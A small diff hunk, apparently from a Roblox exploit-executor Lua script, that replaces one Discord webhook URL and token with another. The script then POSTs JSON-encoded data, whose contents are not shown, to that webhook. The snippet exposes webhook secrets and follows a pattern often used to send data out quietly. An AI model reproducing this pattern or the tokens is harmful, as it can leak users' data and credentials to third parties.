@@ -6271,7 +6271,7 @@ wait(4)
                     local Encoded = HttpService:JSONEncode(Data)
                     
                     Request = http_request or request or HttpPost or syn.request
-                    local Final1 = {Url = "https://discord.com/api/webhooks/1097204703877660853/ttpMTnrEGLmddJb7s2ZdPTi_DXr4Zd-_KJpA99cHM4aVreFaXokvhWh1tJ8EcfFtB0XZ", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final1 = {Url = "https://discord.com/api/webhooks/1097209542628089947/h-smi_GcCfptXa50XE4aP1ibLkUZXJubmlQXfFgW6J6wSUpX0wfJk2-dtJFW085MEMsv", Body = Encoded, Method = "POST", Headers = Headers}
                    
                     Request(Final1)
                                  
